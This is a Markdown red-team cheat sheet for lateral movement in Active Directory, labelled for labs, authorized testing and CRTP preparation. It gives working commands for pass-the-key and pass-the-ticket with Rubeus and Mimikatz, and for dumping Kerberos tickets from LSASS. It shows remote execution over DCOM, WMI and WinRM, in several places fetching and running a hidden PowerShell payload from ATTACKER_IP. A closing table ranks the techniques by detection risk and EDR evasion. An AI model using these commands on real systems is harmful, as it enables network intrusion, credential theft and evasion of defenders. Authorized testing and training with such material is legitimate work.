
# 🔀 Lateral Movement (Advanced Red Team)

> **For lab environments, authorized penetration testing, and CRTP preparation only.**
> 
> _Focus: OPSEC, Living off the Land (LotL), Fileless Execution, and EDR Evasion._

---

## 1. Overpass-the-Hash (Pass-the-Key)

_Using AES-256 keys instead of NTLM hashes is significantly safer for OPSEC and avoids leaving highly suspicious NTLM authentication logs (Event ID 4624 Logon Type 3)._

PowerShell

```powershell
# Request a TGT using an AES-256 key and inject it directly into memory via Rubeus (Stealth PTT)
.\Rubeus.exe asktgt /domain:domain.local /user:Administrator /aes256:AES_KEY_HERE /nowrap /ptt

# Pass-the-Key using Mimikatz (AES-256)
sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES_KEY_HERE /run:cmd.exe
```

---

## 2. DCOM Execution (Ninja Level)

_Unlike WMI or PsExec, the Distributed Component Object Model (DCOM) does not create new services. It executes payloads through legitimate Windows applications, making it highly evasive against standard EDRs._

PowerShell

```powershell
# Remote code execution via MMC20.Application COM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -nop -w hidden -enc <BASE64_PAYLOAD>", "7")

# Execution via ShellWindows object (Spawns under explorer.exe on the target)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "TARGET"))
$com.Windows().Item().Document.Application.ShellExecute("cmd.exe", "/c powershell -nop -w hidden -c iex(iwr http://ATTACKER_IP/payload.ps1 -UseBasicParsing).Content", "C:\Windows\System32", $null, 0)
```

---

## 3. Advanced WMI (Windows Management Instrumentation)

_Utilizing legitimate WMI queries instead of dropping PsExec binaries. Operates over RPC (Port 135)._

PowerShell

```powershell
# Create a remote process using native PowerShell cmdlets (Fileless payload delivery)
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "powershell.exe -nop -w hidden -c iex(iwr http://ATTACKER_IP/payload.ps1 -UseBasicParsing).Content"

# Execution using the native Windows binary (wmic)
wmic /node:TARGET process call create "powershell.exe -nop -w hidden -c iex(iwr http://ATTACKER_IP/payload.ps1 -UseBasicParsing).Content"
```

---

## 4. WinRM / PSRemoting (Port 5985/5986)

_An excellent lateral movement channel for environments where SMB (Port 445) is restricted. All traffic is AES encrypted, even over standard HTTP (5985)._

PowerShell

```powershell
# Native WinRS (Windows Remote Shell) - Useful if PowerShell is heavily restricted/monitored
winrs -remote:TARGET cmd.exe

# Enter an interactive PowerShell session using an injected/stolen token
Enter-PSSession -ComputerName TARGET

# Execute a payload in-memory on the remote server (AMSI bypass may be required on the target)
Invoke-Command -ComputerName TARGET -ScriptBlock { iex(iwr http://ATTACKER_IP/payload.ps1 -UseBasicParsing).Content }
```

---

## 5. Pass-the-Ticket (PTT) & Ticket Extraction

_Injecting a stolen Kerberos ticket (TGT/TGS) into the current session. The cleanest method of authentication._

PowerShell

```powershell
# Inject a base64 encoded ticket into memory via Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET_STRING

# Stealthily extract tickets from remote memory (LSASS) using Rubeus (Requires LPE/Admin on target)
.\Rubeus.exe dump /nowrap
```

---

## 🛡️ OPSEC Notes & Telemetry Matrix

|**Technique**|**Detection Risk**|**Port**|**Artifact Left / Telemetry Generated**|
|---|---|---|---|
|**PsExec (SMB)**|**High**|445|Event 7045 (Service Creation), Event 4697 (Service Install). EDR triggers immediately.|
|**WMI**|**Medium-High**|135/High|Event 4688 (Process Creation with `wmiprvse.exe` as the parent).|
|**PSRemoting**|**Medium**|5985|Event 4624 (Logon Type 3), PowerShell Script Block Logging (Event 4104).|
|**DCOM (MMC20)**|**Low**|135/High|Process creation spawned under `mmc.exe`. Highly stealthy.|
|**Overpass-the-Hash**|**Low**|88|Event 4624 shows Logon Type 9. AES-256 blends seamlessly with normal Kerberos traffic.|
|**Fileless (iex/iwr)**|**Medium-Low**|80/443|Network connection to an unknown IP. Requires an AMSI patch for full stealth execution.|

---

_Created for Active Directory Red Teaming Operations._